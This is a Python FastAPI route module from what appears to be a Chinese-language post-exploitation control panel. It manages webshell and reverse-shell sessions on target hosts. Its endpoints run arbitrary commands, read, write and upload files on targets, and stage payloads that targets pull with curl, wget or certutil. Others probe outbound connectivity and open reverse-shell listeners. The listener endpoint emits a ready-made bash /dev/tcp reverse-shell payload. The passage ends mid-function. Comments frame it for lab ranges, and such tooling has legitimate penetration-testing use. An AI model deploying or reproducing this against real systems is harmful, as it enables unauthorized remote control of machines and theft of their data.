"""Shell 会话：登记(真实连通测试+信息回传) / 执行 / 文件管理 / 终端固化 M1-8 / 出网探测。

所有命令执行与文件读写均经 pivothub/session/ 会话抽象层；本路由层无任何 subprocess。
"""

from __future__ import annotations

import re

from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from sqlalchemy.orm import Session as DBSession

from ..config import DEFAULT_PROJECT_ID
from ..db import get_attack, get_db, get_session_factory, now
from ..models import Host, ReverseListener, Shell
from ..schemas import ShellIn, ShellOut
from ..schemas.common import rid
from ..service import add_event
from ..service import filestage as stage_svc
from ..service import tty as tty_svc
from ..service.probe import run_probes
from ..session import SessionError, get_session
from ..session.reverse import SERVICE as REVERSE_SERVICE, detect_platform
from ..ws import manager
from .deps import get_project

router = APIRouter()

#: 反弹 Shell 通道表：shellId -> ReverseShellChannel（进程内，重启即失效）
REVERSE_CHANNELS: dict[str, object] = {}
#: 原始输出订阅表：shellId -> sink（面板终端打开时注册，关闭时注销）
RAW_SINKS: dict[str, object] = {}
#: 启动恢复失败的监听：listenerId -> 错误原因（前端据此提示「重试恢复」）
RESTORE_ERRORS: dict[str, str] = {}


def close_channel(shell_id: str) -> None:
    """关闭并移除某会话的反弹通道与原始推送（删除会话 / 移除资产时调用，避免漏 socket）。"""
    sink = RAW_SINKS.pop(shell_id, None)
    ch = REVERSE_CHANNELS.pop(shell_id, None)
    if ch is None:
        return
    if sink is not None:
        try:
            ch.remove_raw_sink(sink)
        except Exception:
            pass
    try:
        ch.close()
    except Exception:
        pass

INFO_CMD_LINUX = "id; whoami; uname -a; hostname"
INFO_CMD_WINDOWS = "whoami & ver & hostname"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _get_shell(db: DBSession, shell_id: str) -> Shell:
    """Shell id 全局唯一：按实体定位（面板当前项目仅约束创建入口）。"""
    s = db.get(Shell, shell_id)
    if not s:
        raise HTTPException(404, f"Shell 不存在: {shell_id}")
    return s


def _open_session(db: DBSession, s: Shell):
    # 反弹 Shell 通道：从进程内通道表取回连通道（不重建 HTTP 会话）
    if getattr(s, "kind", "") == "reverse":
        ch = REVERSE_CHANNELS.get(s.id)
        if ch is None:
            raise SessionError("反弹通道不存在或已断开（请重新监听并让靶机回连）")
        return ch
    host = db.get(Host, s.host_id)
    sess = get_session(s, host)
    if s.stable:
        sess.prefer_pty = True
    sess.timeout = min(getattr(sess, "timeout", 10), 6.0)  # 探针快速失败，避免心跳被死靶拖住
    return sess


def _fallback(reason: str, **extra) -> JSONResponse:
    """能力不可用时返回回退标记（不用 5xx：浏览器会记控制台错误）。"""
    body = {"pivothubFallback": True, "reason": reason}
    body.update(extra)
    return JSONResponse(body)


def _stage_host(db: DBSession, project_id: str, shell: Shell, sess) -> str:
    """目标机下载时应访问的攻击机地址。

    优先项目里显式配置的「攻击机网络」；未配置且目标本身是回环地址（本机联调靶）
    时用 127.0.0.1；其余回落到基线默认值。
    """
    from ..models import Project

    project = db.get(Project, project_id)
    cfg = (project.settings or {}).get("attack") if project is not None else None
    if cfg and cfg.get("ip"):
        return str(cfg["ip"])
    url = (getattr(shell, "url", "") or "").lower()
    if "127.0.0.1" in url or "localhost" in url:
        return "127.0.0.1"
    return str((get_attack(db, project_id) or {}).get("ip") or "127.0.0.1")


def _ensure_reachable(sess) -> None:
    """操作前快速探活：死靶 6s 内失败，避免后续探测逐条等 HTTP 超时。"""
    t = sess.test()
    if not t.ok:
        raise SessionError("目标不可达：" + (t.error or "协议探针无回显"))


# ---------------------------------------------------------------------------
# 登记与连接管理
# ---------------------------------------------------------------------------

@router.post("/shells", response_model=ShellOut)
def add_shell(form: ShellIn, db: DBSession = Depends(get_db)):
    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)
    host = db.get(Host, form.hostId)
    if not host or host.project_id != project.id:
        raise HTTPException(404, f"主机不存在: {form.hostId}")

    s = Shell(
        id=rid("s"), project_id=project.id, host_id=host.id, type=form.type,
        kind=form.kind or "", url=form.url, pwd=form.pass_, encoder=form.encoder,
        alive=False, latency=0, last_beat_at=None, hostname=host.hostname,
        privilege=host.privilege, stable=False,
    )
    db.add(s)
    db.flush()

    # 真实连通性测试 + 基础信息回传入库（M1-5 一期子集）
    collect_detail = ""
    try:
        sess = _open_session(db, s)
        t = sess.test()
        s.alive = t.ok
        s.latency = t.ms if t.ok else 0
        s.last_beat_at = now() if t.ok else None
        if t.ok and form.autoCollect:
            info = sess.exec(INFO_CMD_LINUX if sess.platform == "linux" else INFO_CMD_WINDOWS)
            collect_detail = _collect_host_info(db, host, info.output)
    except SessionError as e:
        s.alive = False
        collect_detail = str(e)

    if host and s.alive:
        host.owned = True

    add_event(db, project.id, "shell",
              (f"登记并连接 Shell：{s.url}" + ("" if s.alive else "（连通性测试失败，已标记断线）")),
              host_id=host.id,
              detail=f"类型 {s.type} · 编码器 {s.encoder} · 延迟 {s.latency}ms"
                     + (f" · {collect_detail}" if collect_detail else ""))
    db.commit()
    out = ShellOut.of(s)
    manager.push("shell.created", shell=out.model_dump())
    return out


def _collect_host_info(db: DBSession, host: Host, output: str) -> str:
    """解析 id/uname 真实回显 → 更新资产（M1-5 基础信息自动回传）。"""
    parts: list[str] = []
    m = re.search(r"uid=\d+\(([^)]+)\)", output)
    if m:
        host.privilege = m.group(1)
        parts.append(f"whoami={m.group(1)}")
    else:
        # Windows whoami 回显形如 DOMAIN\user（域账号带 $ 结尾的机器账号也覆盖）
        m = re.search(r"^([A-Za-z0-9._-]+)\\([A-Za-z0-9._$-]+)\s*$", output, re.M)
        if m:
            host.privilege = m.group(2)
            parts.append(f"whoami={m.group(2)}")
    m = re.search(r"(Linux [^\r\n]+|Windows[^\r\n]*)", output)
    if m:
        host.os = m.group(1).strip()[:190]
        parts.append("uname=" + host.os)
    if parts:
        add_event(db, host.project_id, "host", "自动回传基础信息并入库", host_id=host.id,
                  detail=" / ".join(parts), push=True)
    return " / ".join(parts)


@router.post("/shells/{shell_id}/test", response_model=ShellOut)
def test_shell(shell_id: str, db: DBSession = Depends(get_db)):
    """连通性测试：经会话层真实协议探针，延迟落库。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        t = sess.test()
    except SessionError as e:
        s.alive = False
        add_event(db, project_id, "shell", f"Shell 连通性测试失败：{e}", host_id=s.host_id)
        db.commit()
        return ShellOut.of(s)
    s.alive = t.ok
    s.latency = t.ms if t.ok else 0
    s.last_beat_at = now() if t.ok else None
    if t.ok:
        host = db.get(Host, s.host_id)
        if host:
            host.owned = True
        add_event(db, project_id, "shell", f"Shell 连通性正常：{s.url}", host_id=s.host_id,
                  detail=f"协议探针通过 · 延迟 {t.ms}ms")
    else:
        add_event(db, project_id, "shell", f"Shell 连通性测试失败：{t.error}", host_id=s.host_id)
    db.commit()
    return ShellOut.of(s)


@router.post("/shells/heartbeat")
def heartbeat_all(db: DBSession = Depends(get_db)):
    """全量心跳：对存活 Shell 逐个真实协议探针。"""
    project = get_project(db, DEFAULT_PROJECT_ID)
    shells = db.query(Shell).filter(Shell.project_id == project.id, Shell.alive.is_(True)).all()
    beat, lost = 0, []
    for s in shells:
        try:
            if _open_session(db, s).test().ok:
                s.last_beat_at = now()
                beat += 1
            else:
                s.alive = False
                lost.append(s.id)
        except SessionError:
            s.alive = False
            lost.append(s.id)
    db.commit()
    return {"beat": beat, "lost": lost}


@router.delete("/shells/{shell_id}")
def remove_shell(shell_id: str, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    close_channel(shell_id)  # 反弹通道随会话一起关闭，避免残留 socket
    db.delete(s)
    db.commit()
    return {"deleted": shell_id}


# ---------------------------------------------------------------------------
# 虚拟终端：真实命令执行（M1-3）
# ---------------------------------------------------------------------------

class ExecIn(BaseModel):
    cmd: str
    timeout: float = 15.0


@router.post("/shells/{shell_id}/exec")
def exec_command(shell_id: str, form: ExecIn, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        # 反连通道已断开等：如实标记会话状态，并把原因交给前端显式展示（不静默兜底）
        if getattr(s, "kind", "") == "reverse":
            s.alive = False
            db.commit()
            manager.push("shell.beat", shellId=s.id, alive=False, latency=0,
                         lastBeat=ShellOut.of(s).lastBeat)
        return JSONResponse({"ok": False, "output": "", "error": f"会话不可用：{e}",
                             "ms": 0, "timedOut": False, "stage": "session"})
    try:
        _ensure_reachable(sess)
        res = sess.exec(form.cmd, timeout=form.timeout)
    except SessionError as e:
        if getattr(s, "kind", "") == "reverse":
            s.alive = False
            db.commit()
        return JSONResponse({"ok": False, "output": "", "error": str(e), "ms": 0,
                             "timedOut": False, "stage": "exec"})
    s.last_beat_at = now()
    db.commit()
    return {
        "ok": res.ok, "output": res.output, "error": res.error,
        "ms": res.ms, "timedOut": res.timed_out,
    }


# ---------------------------------------------------------------------------
# 交互能力检测 / 终端固化 / 收尾（M1-8，P0）
# ---------------------------------------------------------------------------

@router.post("/shells/{shell_id}/tty/detect")
def tty_detect(shell_id: str, db: DBSession = Depends(get_db)):
    """交互能力检测：真实执行 tty / echo $TERM / stty size / 工具探测并解析。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"会话不可用：{e}")
    try:
        _ensure_reachable(sess)
        result = tty_svc.detect(sess)
    except SessionError as e:
        # 死靶：诚实返回不可达结论（不做假动画，不慢慢超时）
        result = {
            "caps": {"os": sess.platform}, "mode": "dumb", "probeLines": [],
            "summary": f"检测结论：目标不可达（{e}）",
        }
    mode = result["mode"]
    if mode == "full":
        s.stable = True
        s.alive = True
        manager.push("shell.tty", shellId=s.id, mode=mode, hasPty=True)
    db.commit()
    add_event(db, project_id, "shell",
              "终端交互能力检测：" + ("已固化（交互 TTY）" if mode == "full"
                              else "半交互（无 TTY / 无 job control）" if mode == "semi"
                              else "未固化（WebShell 伪终端）"),
              host_id=s.host_id, detail=result["summary"])
    db.commit()
    result["modeLabel"] = ("已固化（交互 TTY）" if mode == "full"
                           else "半交互（无 TTY / 无 job control）" if mode == "semi"
                           else "未固化（WebShell 伪终端）")
    return result


@router.post("/shells/{shell_id}/tty/upgrade")
def tty_upgrade(shell_id: str, form: dict, db: DBSession = Depends(get_db)):
    """执行固化技法，依据 PTY 内真实回显判定（M1-8 核心）。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    fix_id = (form or {}).get("fixId", "")
    from ..db import load_plugin_dir

    fix = next((f for f in load_plugin_dir("tty_fixes") if f.get("id") == fix_id), None)
    if not fix:
        raise HTTPException(404, f"固化技法不存在: {fix_id}")
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"会话不可用：{e}")
    try:
        _ensure_reachable(sess)
        result = tty_svc.upgrade(sess, fix)
    except SessionError as e:
        result = {"hasPty": False, "reason": str(e), "summary": "目标不可达，技法未执行"}

    if result.get("hasPty"):
        s.stable = True
        s.alive = True
        sess.prefer_pty = True
        first_cmd = (fix.get("cmd") or "").splitlines()[0][:200] if fix.get("cmd") else ""
        add_event(db, project_id, "shell", f"终端固化为交互 TTY：{fix.get('name')}",
                  host_id=s.host_id, cmd=first_cmd,
                  detail=f"技法 {fix.get('name')} · 可靠性 {fix.get('reliability')}% · "
                         f"PTY={result.get('tty')} · TERM={result.get('term')} · "
                         f"窗口={result.get('sttySize')} · 会话 {s.id}")
        manager.push("shell.tty", shellId=s.id, mode="full", hasPty=True,
                     term=result.get("term", ""))
    db.commit()
    return result


class FinishIn(BaseModel):
    rows: int = 40
    cols: int = 120


@router.post("/shells/{shell_id}/tty/finish")
def tty_finish(shell_id: str, form: FinishIn | None = None, db: DBSession = Depends(get_db)):
    """收尾：真实执行 stty sane + rows/cols 同步 + TERM 修正，回读验证。"""
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    body = form or FinishIn()
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"会话不可用：{e}")
    try:
        _ensure_reachable(sess)
        result = tty_svc.finish(sess, rows=body.rows, cols=body.cols)
    except SessionError as e:
        result = {"ok": False, "reason": str(e), "summary": f"目标不可达：{e}"}
    if result.get("ok"):
        s.stable = True
        add_event(db, project_id, "shell", "终端收尾完成（stty sane + rows/cols 同步）",
                  host_id=s.host_id, detail=result.get("summary", ""))
        manager.push("shell.tty", shellId=s.id, mode="full", hasPty=True,
                     term=result.get("term", ""))
    db.commit()
    return result


# ---------------------------------------------------------------------------
# 文件管理（M1-4）：浏览 / 读取 / 写入 / 上传
# ---------------------------------------------------------------------------

def _safe_path(p: str) -> str:
    return (p or "/").strip() or "/"


@router.get("/shells/{shell_id}/files")
def files_list(shell_id: str, path: str = "/", db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        entries = sess.list_dir(_safe_path(path))
    except SessionError as e:
        return _fallback(f"列目录失败：{e}")
    # . / .. 由前端面包屑负责导航，不当作条目下发
    entries = [e for e in entries if e.name not in (".", "..")]
    return {
        "cwd": _safe_path(path),
        "entries": [e.to_contract() for e in
                    sorted(entries, key=lambda x: (not x.is_dir, x.name.lower()))],
    }


@router.get("/shells/{shell_id}/files/content")
def files_read(shell_id: str, path: str, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        content = sess.read_file(_safe_path(path))
    except SessionError as e:
        raise HTTPException(422, f"读取失败：{e}")
    return {"path": _safe_path(path), "name": path.rstrip("/").rsplit("/", 1)[-1],
            "content": content}


class WriteIn(BaseModel):
    path: str
    content: str


@router.post("/shells/{shell_id}/files/write")
def files_write(shell_id: str, form: WriteIn, db: DBSession = Depends(get_db)):
    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        sess = _open_session(db, s)
        sess.write_file(_safe_path(form.path), form.content)
    except SessionError as e:
        raise HTTPException(422, f"写入失败：{e}")
    add_event(db, project_id, "shell", f"在线编辑写入 {form.path}", host_id=s.host_id,
              detail=f"{len(form.content)} 字节")
    db.commit()
    return {"ok": True, "path": form.path}


class UploadIn(BaseModel):
    path: str
    name: str
    contentB64: str


@router.post("/shells/{shell_id}/files/upload")
def files_upload(shell_id: str, form: UploadIn, db: DBSession = Depends(get_db)):
    import base64

    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        data = base64.b64decode(form.contentB64)
    except Exception as e:
        raise HTTPException(400, f"base64 解码失败: {e}")
    target = form.path.rstrip("/") + "/" + form.name
    try:
        sess = _open_session(db, s)
        size = sess.upload_file(_safe_path(target), data)  # 二进制安全（分块 base64 / 原始流）
    except SessionError as e:
        return _fallback(f"上传失败：{e}")
    add_event(db, project_id, "shell", f"上传文件 {form.name}", host_id=s.host_id,
              detail=f"目标路径 {target} · {size} 字节")
    db.commit()
    return {"ok": True, "path": target, "size": size}


# ---------------------------------------------------------------------------
# HTTP 拉取上传：攻击机起临时 HTTP 服务 → 目标机用 curl/wget 等自取
# ---------------------------------------------------------------------------

class PullIn(BaseModel):
    """上传「HTTP 拉取」通道入参（contentB64 与分片上传同一契约）。"""

    path: str
    name: str
    contentB64: str
    host: str = ""       # 目标机应访问的攻击机地址；空 = 项目攻击机网络 / 回环
    port: int = 0        # 暂存服务端口；空 = 当前实例端口
    tool: str = ""       # 强制指定下载工具；空 = 自动探测后逐个尝试
    timeout: float = 0.0  # 单次下载超时秒数；0 = 300


@router.get("/shells/{shell_id}/files/pull/tools")
def files_pull_tools(shell_id: str, db: DBSession = Depends(get_db)):
    """目标侧真实探测可用下载工具（curl/wget/python3/certutil/...）。"""
    s = _get_shell(db, shell_id)
    try:
        sess = _open_session(db, s)
    except SessionError as e:
        return _fallback(f"下载工具探测失败：{e}")
    tools = stage_svc.detect_tools(sess)
    platform = getattr(sess, "platform", "linux")
    return {
        "ok": True,
        "platform": platform,
        "tools": [{"key": t, "label": stage_svc.TOOL_LABELS.get(t, t)} for t in tools],
        "cmd": stage_svc.DETECT_CMDS["windows" if platform == "windows" else "linux"],
    }


@router.post("/shells/{shell_id}/files/pull")
def files_pull(shell_id: str, form: PullIn, db: DBSession = Depends(get_db)):
    """把文件暂存在攻击机 HTTP 服务上，由目标机主动下载并按字节数校验。"""
    import base64

    s = _get_shell(db, shell_id)
    project_id = s.project_id
    try:
        data = base64.b64decode(form.contentB64)
    except Exception as e:
        raise HTTPException(400, f"base64 解码失败: {e}")
    target = form.path.rstrip("/") + "/" + form.name
    item = None
    try:
        sess = _open_session(db, s)
        platform = getattr(sess, "platform", "linux")
        item = stage_svc.STAGE.add(form.name, data)
        host = form.host.strip() or _stage_host(db, project_id, s, sess)
        port = form.port or stage_svc.STAGE.bound_port
        url = f"http://{host}:{port}/s/{item.token}/{item.name}"
        tools = [form.tool] if form.tool else stage_svc.detect_tools(sess)
        result = stage_svc.pull_file(
            sess, url, _safe_path(target), len(data),
            platform=platform, tools=tools, timeout=form.timeout or 300.0,
        )
    except SessionError as e:
        return _fallback(f"HTTP 拉取失败：{e}")
    finally:
        # 拉取结果已定（成功或全部工具失败）后立即撤下暂存条目，不留暴露面
        if item is not None:
            stage_svc.STAGE.drop(item.token)
    if not result.ok:
        return _fallback(result.reason, log=result.log, url=url, platform=platform)
    add_event(db, project_id, "shell", f"上传文件 {form.name}", host_id=s.host_id,
              detail=f"HTTP 拉取（{result.tool}）· 目标路径 {target} · {result.size} 字节")
    db.commit()
    return {"ok": True, "path": target, "size": result.size, "tool": result.tool,
            "url": url, "cmd": result.cmd, "log": result.log}


# ---------------------------------------------------------------------------
# 出网探测（M2 出网探测）：经会话层真实执行 ICMP / DNS / HTTP / TCP
# ---------------------------------------------------------------------------

class ProbeIn(BaseModel):
    """探测目标可覆盖（缺省用内置基线）。"""

    icmpHost: str = ""
    dnsName: str = ""
    httpUrl: str = ""
    tcpHost: str = ""
    tcpPort: int = 0


@router.post("/shells/{shell_id}/probe")
def shell_probe(shell_id: str, form: ProbeIn | None = None, db: DBSession = Depends(get_db)):
    """真实执行四类出网探针，解析真实回显 → verdict/recommend/alt/reason。

    逐探针 WS 推送 probe.result；结论入时间线（前端「出网探测」弹窗消费）。
    """
    s = _get_shell(db, shell_id)
    host = db.get(Host, s.host_id)
    try:
        sess = _open_session(db, s)
        _ensure_reachable(sess)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "reachable", "error": str(e),
                             "verdict": "", "recommend": "", "alt": "",
                             "reason": f"探测未执行：{e}", "probes": []})

    opts = {k: v for k, v in (form.model_dump() if form else {}).items() if v}
    report = run_probes(sess, host_id=s.host_id, opts=opts)

    for p in report.probes:
        manager.push("probe.result", hostId=s.host_id, probe=p.key,
                     ok=(p.state == "ok"), ms=p.ms, evidence=p.evidence, cmd=p.cmd)

    add_event(db, s.project_id, "proxy", f"出网探测完成：{report.verdict}",
              host_id=s.host_id,
              detail=f"推荐 {report.recommend}" + (f" · 备选 {report.alt}" if report.alt else "")
                     + " · 证据 " + "; ".join(f"{p.key}={p.state}" for p in report.probes))
    db.commit()
    out = report.to_dict()
    out["ok"] = True
    return out


# ---------------------------------------------------------------------------
# 反弹 Shell 通道（会话层 reverse 驱动）：监听 → 靶机回连 → 登记会话
# ---------------------------------------------------------------------------

class ReverseListenIn(BaseModel):
    """开监听：bind 缺省 127.0.0.1（合规）；真实靶场回连攻击机 VPN 地址时显式传该地址。"""

    bind: str = "127.0.0.1"
    port: int
    label: str = ""
    #: 监听后阻塞等待回连的秒数（0 = 不等待，仅开监听）
    waitS: float = 0.0
    #: 同地址端口已有「未回连」的监听时是否自动替换（休眠/断线后的残留监听会占住端口）
    replacePending: bool = True


class ReverseRegisterIn(BaseModel):
    projectId: str = ""
    listenerId: str
    hostId: str
    type: str = "反弹 Shell（/dev/tcp）"
    autoCollect: bool = True


@router.post("/shells/reverse/listen")
def reverse_listen(form: ReverseListenIn):
    """在攻击机侧开启反弹监听（真实 socket，仅监听显式地址）。

    地址校验：非回环地址必须是**本机当前真实拥有的地址**——休眠 / 换网后旧 IP 会失效，
    直接 bind 会得到 WinError 10049，这里提前给出可操作提示。
    """
    bind = (form.bind or "127.0.0.1").strip()
    if bind not in ("127.0.0.1", "localhost"):
        from .attack import _local_ipv4

        local_ips = _local_ipv4()
        if bind not in local_ips:
            return JSONResponse({
                "ok": False, "stage": "bind",
                "error": f"本机当前没有地址 {bind}（休眠 / 换网后 IP 可能变了），请重新检测本机 IP",
                "localIps": local_ips,
            })
    try:
        lis, replaced = REVERSE_SERVICE.open(
            bind, form.port, form.label, replace_pending=form.replacePending)
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "listen", "error": str(e)})
    _persist_listener(lis)
    connected = lis.wait(form.waitS) if form.waitS and form.waitS > 0 else False
    return {"ok": True, "listener": lis.to_dict(), "replaced": replaced, "connected": connected,
            "payload": f"bash -i >& /dev/tcp/{bind}/{int(form.port)} 0>&1"}


def _persist_listener(lis) -> None:
    """监听写入持久表（面板重启后自动恢复）；同地址端口的旧记录先清掉。"""
    db = get_session_factory()()
    try:
        db.query(ReverseListener).filter(
            ReverseListener.bind == lis.bind,
            ReverseListener.port == lis.port,
            ReverseListener.id != lis.id,
        ).delete(synchronize_session=False)
        if db.get(ReverseListener, lis.id) is None:
            db.add(ReverseListener(
                id=lis.id, bind=lis.bind, port=lis.port, label=lis.label,
                created_at=now().strftime("%Y-%m-%d %H:%M:%S"),
            ))
        db.commit()
    finally:
        db.close()


def restore_reverse_listeners() -> dict:
    """按持久表恢复监听（面板启动时调用）。

    地址已失效（休眠 / 换网）或端口被占时不删记录，把原因记入 RESTORE_ERRORS：
    前端在监听列表里显示为「未恢复」，可用「重试恢复」重新拉起。
    """
    RESTORE_ERRORS.clear()
    db = get_session_factory()()
    restored, failed = 0, []
    try:
        for row in db.query(ReverseListener).all():
            try:
                REVERSE_SERVICE.open(row.bind, row.port, row.label,
                                     replace_pending=False, listener_id=row.id)
                restored += 1
            except Exception as e:  # 单个监听恢复失败不影响其余
                RESTORE_ERRORS[row.id] = str(e)
                failed.append({"id": row.id, "bind": row.bind, "port": row.port,
                               "error": str(e)})
    finally:
        db.close()
    return {"restored": restored, "failed": failed}


@router.get("/shells/reverse/listeners")
def reverse_listeners():
    """监听列表 = 进程内活跃监听 + 持久表里尚未恢复的监听（含失败原因）。"""
    active = {l["id"]: l for l in REVERSE_SERVICE.list()}
    db = get_session_factory()()
    try:
        rows = db.query(ReverseListener).all()
    finally:
        db.close()
    out = []
    for r in rows:
        item = active.pop(r.id, None)
        if item is None:
            item = {"id": r.id, "bind": r.bind, "port": r.port, "label": r.label,
                    "connected": False, "peer": None, "active": False,
                    "error": RESTORE_ERRORS.get(r.id, "")}
        else:
            item["active"] = True
            item["error"] = ""
        out.append(item)
    for item in active.values():  # 进程内但未落库（理论上不会出现）
        item["active"] = True
        item["error"] = ""
        out.append(item)
    return {"listeners": out}


@router.post("/shells/reverse/listeners/restore")
def reverse_listeners_restore():
    """重试恢复启动时失败的监听（换网后地址又回来了等场景）。"""
    return restore_reverse_listeners()


@router.delete("/shells/reverse/listeners/{listener_id}")
def reverse_listener_close(listener_id: str):
    """关闭单个监听（释放端口）并删除持久记录。"""
    ok = REVERSE_SERVICE.close(listener_id)
    db = get_session_factory()()
    try:
        row = db.get(ReverseListener, listener_id)
        if row is not None:
            db.delete(row)
            db.commit()
            ok = True
    finally:
        db.close()
    RESTORE_ERRORS.pop(listener_id, None)
    return {"ok": ok}


@router.delete("/shells/reverse/listeners")
def reverse_listener_close_all():
    """关闭全部监听（休眠 / 收尾后清理残留端口）并清空持久记录。"""
    closed = REVERSE_SERVICE.close_all()
    db = get_session_factory()()
    try:
        db.query(ReverseListener).delete(synchronize_session=False)
        db.commit()
    finally:
        db.close()
    RESTORE_ERRORS.clear()
    return {"ok": True, "closed": closed}


class ReverseIOIn(BaseModel):
    """交互式通道读写：喂密码/读取交互程序输出（su / ssh / mysql 等）。"""

    data: str = ""            # send 时写入通道的原始文本
    until: list[str] = []     # read 时等待命中的模式
    timeout: float = 20.0


@router.post("/shells/{shell_id}/io")
def reverse_io(shell_id: str, form: ReverseIOIn, db: DBSession = Depends(get_db)):
    """反弹通道的原始读写（仅 kind=reverse 会话可用；用于交互式程序）。"""
    s = _get_shell(db, shell_id)
    ch = REVERSE_CHANNELS.get(shell_id)
    if ch is None:
        return JSONResponse({"ok": False, "stage": "channel",
                             "error": "该会话不是活跃反弹通道（或已断开）"})
    if form.data:
        try:
            ch.send_raw(form.data)
        except OSError as e:
            return JSONResponse({"ok": False, "stage": "write", "error": str(e)})
    if form.until:
        text, hit = ch.read_until(form.until, timeout=form.timeout)
        return {"ok": True, "hit": hit, "text": text}
    return {"ok": True, "hit": "", "text": ""}


#: 控制键 → 实际写入 PTY 的字节（终端面板按钮 / 键盘快捷键使用）
KEY_SEQ = {
    "ctrl-c": "\x03", "ctrl-d": "\x04", "ctrl-z": "\x1a",
    "tab": "\t", "enter": "\r", "esc": "\x1b",
    "up": "\x1b[A", "down": "\x1b[B", "left": "\x1b[D", "right": "\x1b[C",
}


class RawInputIn(BaseModel):
    """原始输入：data 直接写入 PTY；key 走控制键映射（Ctrl+C / Tab / 回车等）。"""

    data: str = ""
    key: str = ""


class RawModeIn(BaseModel):
    on: bool = True


def _channel_of(db: DBSession, shell_id: str):
    s = _get_shell(db, shell_id)
    if getattr(s, "kind", "") != "reverse":
        raise HTTPException(400, "仅反弹 Shell 会话支持原始交互")
    ch = REVERSE_CHANNELS.get(shell_id)
    if ch is None:
        raise HTTPException(409, "反弹通道不存在或已断开（请重新监听并让靶机回连）")
    return s, ch


@router.post("/shells/{shell_id}/input")
def shell_raw_input(shell_id: str, form: RawInputIn, db: DBSession = Depends(get_db)):
    """原始输入（反弹通道专用）：直接写进目标 PTY，不做哨兵同步。

    交互式程序（mysql / su / vim）与长命令（ping）因此不会卡住会话；
    Ctrl+C 用 key=ctrl-c 发送。
    """
    s, ch = _channel_of(db, shell_id)
    text = form.data or KEY_SEQ.get(str(form.key or "").lower(), "")
    if not text:
        raise HTTPException(400, "空输入（data 与 key 至少给一个）")
    try:
        ch.write_raw(text)
    except OSError as e:
        return JSONResponse({"ok": False, "stage": "write", "error": f"写入失败：{e}"})
    s.last_beat_at = now()
    db.commit()
    return {"ok": True, "bytes": len(text.encode("utf-8"))}


@router.post("/shells/{shell_id}/raw")
def shell_raw_mode(shell_id: str, form: RawModeIn, db: DBSession = Depends(get_db)):
    """开关原始输出推送：打开后该会话的目标侧输出逐块推给面板终端（真实提示符可见）。

    on 幂等且总是重建订阅：只按 RAW_SINKS 判存在会让「表里有、通道上没有」的
    陈旧条目永远无法恢复（表现为终端一片空白）。
    """
    s, ch = _channel_of(db, shell_id)
    if form.on:
        old = RAW_SINKS.pop(shell_id, None)
        if old is not None:
            ch.remove_raw_sink(old)

        def _sink(text: str, sid: str = shell_id) -> None:
            manager.push("shell.output", shellId=sid, kind="raw", line=text)

        ch.add_raw_sink(_sink)
        RAW_SINKS[shell_id] = _sink
        history = ch.recent_output()
        if history:
            _sink(history)  # 回放缓冲尾部：补回连接横幅 / 首屏提示符等历史细节
    else:
        sink = RAW_SINKS.pop(shell_id, None)
        if sink is not None:
            ch.remove_raw_sink(sink)
    return {"ok": True, "raw": bool(form.on)}


@router.post("/shells/reverse/register")
def reverse_register(form: ReverseRegisterIn, db: DBSession = Depends(get_db)):
    """把已回连的通道登记为面板会话（kind=reverse），后续 exec/文件/固化全部复用会话层。"""
    project = get_project(db, form.projectId or DEFAULT_PROJECT_ID)
    host = db.get(Host, form.hostId)
    if not host or host.project_id != project.id:
        raise HTTPException(404, f"主机不存在: {form.hostId}")
    try:
        lis = REVERSE_SERVICE.get(form.listenerId)
        if not lis.connected.is_set():
            return JSONResponse({"ok": False, "stage": "callback",
                                 "error": "尚无回连（请先在靶机执行 /dev/tcp 反弹命令）"})
        ch = lis.take()
    except SessionError as e:
        return JSONResponse({"ok": False, "stage": "channel", "error": str(e)})

    s = Shell(
        id=rid("s"), project_id=project.id, host_id=host.id, type=form.type,
        kind="reverse", url=f"reverse://{ch.peer[0]}:{ch.peer[1]}", pwd="",
        encoder="none", alive=False, latency=0, last_beat_at=None,
        hostname=host.hostname, privilege=host.privilege, stable=False,
    )
    db.add(s)
    db.flush()
    REVERSE_CHANNELS[s.id] = ch

    def _mark_lost(sid: str = s.id) -> None:
        """通道 EOF：把会话标记断线并广播（列表绿点必须与真实通道一致）。"""
        db2 = get_session_factory()()
        try:
            row = db2.get(Shell, sid)
            if row is not None and row.alive:
                row.alive = False
                row.latency = 0
                db2.commit()
                manager.push("shell.beat", shellId=sid, alive=False, latency=0,
                             lastBeat=ShellOut.of(row).lastBeat)
        except Exception:
            pass
        finally:
            db2.close()

    ch.add_eof_hook(_mark_lost)

    collect_detail = ""
    t = ch.test()
    s.alive = t.ok
    s.latency = t.ms if t.ok else 0
    s.last_beat_at = now() if t.ok else None
    if t.ok:
        # 平台按回连回显识别（不再固定 linux）：决定后续文件命令与终端固化技法选择
        platform = detect_platform(ch) or "linux"
        ch.platform = platform
        s.platform = platform
    if t.ok and form.autoCollect:
        probe = ("whoami; ver; hostname" if s.platform == "windows"
                 else "id; uname -a; hostname")
        info = ch.exec(probe)
        collect_detail = _collect_host_info(db, host, info.output)
    if s.alive:
        host.owned = True

    add_event(db, project.id, "shell",
              f"反弹 Shell 回连成功并登记：{ch.peer[0]}:{ch.peer[1]}",
              host_id=host.id,
              detail=f"监听 {lis.bind}:{lis.port} · 延迟 {s.latency}ms"
                     + (f" · {collect_detail}" if collect_detail else ""))
    db.commit()
    out = ShellOut.of(s)
